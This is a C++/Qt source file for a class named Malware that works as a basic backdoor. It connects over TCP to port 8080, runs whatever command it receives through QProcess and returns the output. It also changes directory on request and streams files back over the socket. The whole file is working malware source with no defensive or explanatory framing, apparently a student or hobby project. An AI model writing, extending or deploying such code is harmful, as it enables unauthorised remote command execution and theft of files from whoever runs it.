#include "malware.h"
#include <QtDebug>
#include <QByteArray>
#include <QHostAddress>
#include <QStyle>
#include <QtNetwork>
#include <QProcess>

Malware::Malware()
{
    ConnectToServer();
//    QTimer *try_to_connect = new QTimer();
   // connect(try_to_connect, &QTimer::timeout, this, &Malware::ConnectToServer);
   // try_to_connect->start(3000);
}

void Malware::ConnectToServer()
{
 // if(connection_state)
    //{
        qDebug() << "try to connecting";
        client_Socket = new QTcpSocket();
        QString serverIP;

        QList<QHostAddress> ipAddressesList = QNetworkInterface::allAddresses();

        for (const QHostAddress &address : ipAddressesList) {
            if (address != QHostAddress::LocalHost && address != QHostAddress::LocalHostIPv6 &&
                address.protocol() == QAbstractSocket::IPv4Protocol)
            {
                serverIP = address.toString();
                break;
            }
        }
            client_Socket->connectToHost(serverIP, 8080);
            //if(client_Socket->state() == QTcpSocket::ConnectedState)
            //    connection_state = 0;

            connect(client_Socket, SIGNAL(readyRead()), this, SLOT(Read_Data()));
   // }
    qDebug() << "connected.";
}

void Malware::Write_Data(QString out)
{
    qDebug() << "Write data";

    if (!out.isEmpty())
    {
        QByteArray requestData = out.toUtf8();
            client_Socket->write(requestData);
            client_Socket->waitForBytesWritten();
    }
}

void Malware::Read_Data()
{
    QByteArray data = client_Socket->readAll();
    if(data.contains("=save_dir>"))
    {
        qDebug() << data;
        dir = data.remove(0,10);
        qDebug() << dir;
        return;
    }
    if(data.contains("=change_dir>"))
    {
        QString path = data.remove(0,15);
        qDebug() << path;

        if(d.cd(path))
            Write_Data("current dir : " + d.path());
        else{
            Write_Data("dir is not exist !");
        }
        return;
    }

    qDebug() << "Read data : " + data;
    procces_the_command(data);
}

void Malware::procces_the_command(QString command) {
    QProcess proc;
    proc.start(command);
    proc.waitForFinished();
    QString output = proc.readAllStandardOutput();
    qDebug() << output;
    Write_Data(output);
}

void Malware::send_file(QString pa)
{
    QString path = pa;
    QFile inputFile(path);
    QByteArray read ;
    inputFile.open(QIODevice::ReadOnly);
    while(1)
    {
        read.clear();
        read = inputFile.read(32768*8);
        qDebug() << "Read : " << read.size();
        if(read.size()==0)
           break;
        Write_Data(read);
        read.clear();
    }
    inputFile.close();
}


